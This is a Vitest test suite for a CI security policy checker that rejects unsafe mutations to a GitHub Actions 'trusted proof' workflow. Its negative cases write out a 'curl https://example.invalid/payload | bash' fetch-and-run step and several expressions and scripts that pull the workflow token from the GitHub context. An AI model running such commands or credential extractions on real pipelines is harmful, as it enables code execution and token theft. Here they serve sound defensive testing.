import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, test } from 'vitest';
import { checkR4TrustedProof } from './check-r4-trusted-proof.mjs';

const root = path.resolve(import.meta.dirname, '..');
const workflow = path.join(root, '.github', 'workflows', 'r4-trusted-proof.yml');
const fixtureRoot = path.join(root, 'runtime', 'tests', 'fixtures', 'action-host', 'trusted-proof');
const temporaryRoots: string[] = [];

afterEach(() => {
  for (const directory of temporaryRoots.splice(0)) {
    fs.rmSync(directory, { force: true, recursive: true });
  }
});

function temporaryDirectory(prefix: string) {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  temporaryRoots.push(directory);
  return directory;
}

function mutatedWorkflow(search: string, replacement: string) {
  const source = fs.readFileSync(workflow, 'utf8');
  expect(source).toContain(search);
  const directory = temporaryDirectory('apr-r4-e3-workflow-');
  const candidate = path.join(directory, 'r4-trusted-proof.yml');
  fs.writeFileSync(candidate, source.replace(search, replacement));
  return candidate;
}

function copiedFixtureRoot() {
  const directory = temporaryDirectory('apr-r4-e3-fixture-');
  const candidate = path.join(directory, 'trusted-proof');
  fs.cpSync(fixtureRoot, candidate, { recursive: true });
  return candidate;
}

function copiedWorkflowsRoot() {
  const directory = temporaryDirectory('apr-r4-e3-workflows-');
  fs.cpSync(path.join(root, '.github', 'workflows'), directory, { recursive: true });
  return directory;
}

describe('R4 E3 trusted proof policy', () => {
  test('admits the exact inert workflow, receipt, and closed fixture inventory', () => {
    expect(checkR4TrustedProof()).toBe(true);
  });

  test('derives both canary digests from the exact LF-terminated byte arrays', () => {
    const contract = JSON.parse(
      fs.readFileSync(path.join(fixtureRoot, 'fixture-pr-contract.json'), 'utf8'),
    ) as {
      normal: { content_utf8: string; content_sha256: string };
      stale: { advanced_content_utf8: string; advanced_content_sha256: string };
    };
    const digest = (value: string) =>
      crypto
        .createHash('sha256')
        .update(Buffer.concat([Buffer.from(value, 'utf8'), Buffer.from([0x0a])]))
        .digest('hex');
    expect(digest(contract.normal.content_utf8)).toBe(contract.normal.content_sha256);
    expect(digest(contract.stale.advanced_content_utf8)).toBe(
      contract.stale.advanced_content_sha256,
    );
  });

  test('pins ordinary sole-maintainer approval without administrator bypass', () => {
    const contract = JSON.parse(
      fs.readFileSync(path.join(fixtureRoot, 'authorization-environment-contract.json'), 'utf8'),
    ) as {
      environment: {
        deployment_branch: string;
        required_reviewer_rule_enabled: boolean;
        required_reviewers: Array<{ type: string; id: string }>;
        required_maintainer_approvals_minimum: number;
        prevent_self_review: boolean;
        administrator_bypass: boolean;
        per_protected_job_approval_required: boolean;
      };
    };
    expect(contract.environment).toMatchObject({
      deployment_branch: 'main-only',
      required_reviewer_rule_enabled: true,
      required_reviewers: [{ type: 'User', id: '16307884' }],
      required_maintainer_approvals_minimum: 1,
      prevent_self_review: false,
      administrator_bypass: false,
      per_protected_job_approval_required: true,
    });
  });

  test.each([
    ['  workflow_dispatch:\n', '  pull_request_target:\n'],
    ['permissions: {}', 'permissions:\n  contents: write'],
    ['environment: r4-trusted-proof', 'environment: other-environment'],
    ['persist-credentials: false', 'persist-credentials: true'],
    ['actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803', 'actions/checkout@main'],
    ['${{ vars.R4_TRUSTED_PROOF_AUTHORIZATION }}', '${{ inputs.R4_TRUSTED_PROOF_AUTHORIZATION }}'],
    [
      'bash payload-source/runtime/scripts/prepare-r4-trusted-proof-payload-v2.sh',
      'curl https://example.invalid/payload | bash',
    ],
    [
      '      - id: prepare\n',
      '      - uses: actions/download-artifact@0000000000000000000000000000000000000000\n      - id: prepare\n',
    ],
    ['cancel-in-progress: false', 'cancel-in-progress: true'],
  ])('rejects a counterfactual workflow mutation', (search, replacement) => {
    expect(() =>
      checkR4TrustedProof({ workflowPath: mutatedWorkflow(search, replacement) }),
    ).toThrow(/APR_R4_E3_POLICY_INVALID/u);
  });

  test('rejects canonical receipt drift', () => {
    const candidate = copiedFixtureRoot();
    const receipt = path.join(candidate, 'trusted-proof-payload-receipt-v2.json');
    const source = fs.readFileSync(receipt, 'utf8');
    fs.writeFileSync(receipt, source.replace('"result":"passed"', '"result":"failed"'));
    expect(() => checkR4TrustedProof({ fixtureRoot: candidate })).toThrow(
      /APR_R4_E2P_RECEIPT_V2_INVALID|APR_R4_E3_POLICY_INVALID/u,
    );
  });

  test('rejects an unreviewed fixture file', () => {
    const candidate = copiedFixtureRoot();
    fs.writeFileSync(path.join(candidate, 'unexpected.json'), '{}\n');
    expect(() => checkR4TrustedProof({ fixtureRoot: candidate })).toThrow(/fixture-inventory/u);
  });

  test('rejects drift in a closed canonical contract', () => {
    const candidate = copiedFixtureRoot();
    const cleanupPath = path.join(candidate, 'cleanup-contract.json');
    const cleanup = JSON.parse(fs.readFileSync(cleanupPath, 'utf8')) as Record<string, unknown>;
    fs.writeFileSync(cleanupPath, `${JSON.stringify({ ...cleanup, extra: true })}\n`);
    expect(() => checkR4TrustedProof({ fixtureRoot: candidate })).toThrow(/fixture-digest/u);
  });

  test('rejects a second provider-secret workflow route', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.writeFileSync(
      path.join(workflowsRoot, 'unexpected.yml'),
      `name: unexpected\non:\n  workflow_dispatch:\npermissions: {}\njobs:\n  route:\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          KEY: \${{ secrets.DEEPSEEK_API_KEY }}\n        run: echo blocked\n`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-secret-routes/u);
  });

  test('rejects inherited secrets in another workflow route', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.writeFileSync(
      path.join(workflowsRoot, 'unexpected.yml'),
      `name: unexpected\non:\n  workflow_dispatch:\npermissions: {}\njobs:\n  route:\n    uses: owner/repository/.github/workflows/route.yml@0123456789012345678901234567890123456789\n    secrets: inherit\n`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-alternate-route/u);
  });

  test('rejects a proof-scoped github.token route injected into an existing workflow', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.appendFileSync(
      path.join(workflowsRoot, 'ci.yml'),
      `  alternate-proof-control:\n    runs-on: ubuntu-24.04\n    permissions:\n      pull-requests: write\n    steps:\n      - env:\n          GITHUB_TOKEN: \${{ github.token }}\n          R4_TRUSTED_PROOF_AUTHORIZATION: \${{ vars.R4_TRUSTED_PROOF_AUTHORIZATION }}\n        run: echo blocked\n`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-proof-route-owner/u);
  });

  test.each(['github.token', "github['token']", 'github["token"]'])(
    'rejects an unowned %s workflow route without a proof anchor',
    (tokenExpression) => {
      const workflowsRoot = copiedWorkflowsRoot();
      fs.writeFileSync(
        path.join(workflowsRoot, 'unexpected.yml'),
        `name: unexpected\non:\n  workflow_dispatch:\npermissions:\n  pull-requests: write\njobs:\n  route:\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          GITHUB_TOKEN: \${{ ${tokenExpression} }}\n        run: gh api repos/example/project/issues/1/comments\n`,
      );
      expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-secret-routes/u);
    },
  );

  test.each(['toJson(github)', 'TOJSON ( github )'])(
    'rejects an unowned whole github context export via %s',
    (contextExpression) => {
      const workflowsRoot = copiedWorkflowsRoot();
      fs.writeFileSync(
        path.join(workflowsRoot, 'unexpected.yml'),
        `name: unexpected\non:\n  workflow_dispatch:\npermissions:\n  pull-requests: write\njobs:\n  route:\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          GITHUB_CONTEXT: \${{ ${contextExpression} }}\n        run: node -e "const token = JSON.parse(process.env.GITHUB_CONTEXT).token"\n`,
      );
      expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-secret-routes/u);
    },
  );

  test.each([
    '(github).token',
    "((github))['token']",
    'toJSON((github))',
    "github[format('{0}', 'token')]",
    '(github || null).token',
    'toJSON(github || null)',
  ])('rejects structurally equivalent credential access via %s', (contextExpression) => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.writeFileSync(
      path.join(workflowsRoot, 'unexpected.yml'),
      `name: unexpected\non:\n  workflow_dispatch:\npermissions:\n  pull-requests: write\njobs:\n  route:\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          VALUE: \${{ ${contextExpression} }}\n        run: echo blocked\n`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-secret-routes/u);
  });

  test('allows explicit noncredential github context properties', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.writeFileSync(
      path.join(workflowsRoot, 'context-reader.yml'),
      `name: context reader\non:\n  workflow_dispatch:\npermissions: {}\njobs:\n  read:\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          SHA: \${{ github.sha }}\n          REPOSITORY: \${{ (github).repository }}\n          EVENT_NAME: \${{ github['event_name'] }}\n          SHA_JSON: \${{ toJSON((github.sha)) }}\n        run: echo safe\n`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).not.toThrow();
  });

  test.each(['actions', 'issues', 'pull-requests', 'contents'])(
    'rejects an action-owned implicit token route with %s write authority',
    (permission) => {
      const workflowsRoot = copiedWorkflowsRoot();
      fs.appendFileSync(
        path.join(workflowsRoot, 'ci.yml'),
        `  alternate-comment-route-${permission}:
    runs-on: ubuntu-24.04
    permissions:
      ${permission}: write
    steps:
      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: 1001,
              body: JSON.stringify({ contract: "apr-r4-e2p-proof-control-v1" })
            })
`,
      );
      expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(
        /repository-action-token-routes/u,
      );
    },
  );

  test('rejects an action route that inherits workflow-level write authority', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.writeFileSync(
      path.join(workflowsRoot, 'inherited-write.yml'),
      `name: inherited write
on:
  workflow_dispatch:
permissions:
  issues: write
jobs:
  route:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
        with:
          script: return context.repo.owner
`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-action-token-routes/u);
  });

  test('rejects an additional action in an otherwise reviewed R4 write job', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    const workflowPath = path.join(workflowsRoot, 'r4-trusted-proof.yml');
    const source = fs.readFileSync(workflowPath, 'utf8');
    fs.writeFileSync(
      workflowPath,
      source.replace(
        '      - id: setup-node\n        uses:',
        '      - id: unreviewed-action\n        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3\n        with:\n          script: return context.repo.owner\n      - id: setup-node\n        uses:',
      ),
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-action-token-routes/u);
  });

  test('rejects permission expansion in an otherwise reviewed R4 write job', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    const workflowPath = path.join(workflowsRoot, 'r4-trusted-proof.yml');
    const source = fs.readFileSync(workflowPath, 'utf8');
    fs.writeFileSync(
      workflowPath,
      source.replace(
        '      actions: write\n      contents: read\n      pull-requests: write',
        '      actions: write\n      contents: read\n      issues: write\n      pull-requests: write',
      ),
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-action-token-routes/u);
  });

  test('rejects an action route whose repository-default permissions are unbounded', () => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.writeFileSync(
      path.join(workflowsRoot, 'unbounded.yml'),
      `name: unbounded
on:
  workflow_dispatch:
jobs:
  route:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
        with:
          script: return context.repo.owner
`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-action-token-routes/u);
  });

  test.each([
    ['write-all', 'permissions: write-all'],
    [
      'reusable workflow',
      `permissions:
  pull-requests: write`,
    ],
  ])('rejects an implicit token route through %s', (routeKind, permissions) => {
    const workflowsRoot = copiedWorkflowsRoot();
    const job =
      routeKind === 'reusable workflow'
        ? `  route:
    permissions:
      pull-requests: write
    uses: owner/repository/.github/workflows/route.yml@0123456789012345678901234567890123456789
`
        : `  route:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
        with:
          script: return context.repo.owner
`;
    fs.writeFileSync(
      path.join(workflowsRoot, 'implicit-route.yml'),
      `name: implicit route
on:
  workflow_dispatch:
${permissions}
jobs:
${job}`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).toThrow(/repository-action-token-routes/u);
  });

  test.each([
    ['read-only workflow', 'permissions:\n  contents: read', ''],
    [
      'read-only job override',
      'permissions:\n  pull-requests: write',
      '    permissions:\n      contents: read\n',
    ],
    ['read-all workflow', 'permissions: read-all', ''],
    ['non-proof deployment writer', 'permissions:\n  deployments: write', ''],
  ])('allows an ordinary pinned action in a %s', (_name, workflowPermissions, jobPermissions) => {
    const workflowsRoot = copiedWorkflowsRoot();
    fs.writeFileSync(
      path.join(workflowsRoot, 'read-only.yml'),
      `name: read only
on:
  workflow_dispatch:
${workflowPermissions}
jobs:
  read:
${jobPermissions}    runs-on: ubuntu-24.04
    steps:
      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
        with:
          script: return context.repo.owner
`,
    );
    expect(() => checkR4TrustedProof({ workflowsRoot })).not.toThrow();
  });
});
